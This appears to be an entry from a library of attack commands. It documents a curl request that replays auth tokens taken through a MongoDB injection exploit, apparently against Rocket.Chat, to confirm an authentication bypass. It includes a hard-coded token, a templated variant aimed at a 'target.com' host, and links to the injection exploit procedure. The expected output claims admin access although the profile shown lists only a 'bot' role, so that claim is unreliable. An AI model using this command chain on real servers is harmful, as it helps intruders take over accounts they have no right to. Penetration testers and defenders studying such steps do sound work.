---
data: >-
  curl -H "x-user-id: rocket.cat" -H "x-auth-token:
  MnTHVIRTZfRBQiFQYzWZ1xbBlL4BUwK2-3UBWTftXpB" http://127.0.0.1:3000/api/v1/me
tags:
  - auth-bypass
  - verification
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:31:30.838Z'
id: 26b55f0a-d53a-4374-bcb3-bf05b8ab54ba
verified: false
validated: true
submitted: true
---
# curl-verify-auth-bypass-with-me-endpoint

## Command

```bash
curl -H "x-user-id: rocket.cat" -H "x-auth-token: MnTHVIRTZfRBQiFQYzWZ1xbBlL4BUwK2-3UBWTftXpB" http://127.0.0.1:3000/api/v1/me
```

## Description

This command uses obtained auth tokens from the injection exploit to query the /api/v1/me endpoint, verifying successful authentication bypass and privileged access level.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-H "x-user-id: rocket.cat"` | Sets the bypassed user ID header | Yes |
| `-H "x-auth-token: MnTHVIRTZfRBQiFQYzWZ1xbBlL4BUwK2-3UBWTftXpB"` | Sets the authentication token header | Yes |
| `http://127.0.0.1:3000/api/v1/me` | Endpoint to fetch user profile | Yes |

## Examples

### Basic Usage

```bash
curl -H "x-user-id: rocket.cat" -H "x-auth-token: MnTHVIRTZfRBQiFQYzWZ1xbBlL4BUwK2-3UBWTftXpB" http://127.0.0.1:3000/api/v1/me
```

### Advanced Usage

```bash
curl -s -H "x-user-id: $USER_ID" -H "x-auth-token: $AUTH_TOKEN" 'https://target.com/api/v1/me' | jq .
```

## Expected Output

JSON user profile: {"user":{"_id":"rocket.cat","name":"Rocket.Cat","username":"rocket.cat","roles":["bot"],"status":"online"}} confirming admin access.

## Related

- [[commands/curl-mongodb-injection-login-bypass]]
- [[procedures/Exploit-MongoDB-Injection-for-Auth-Bypass]]
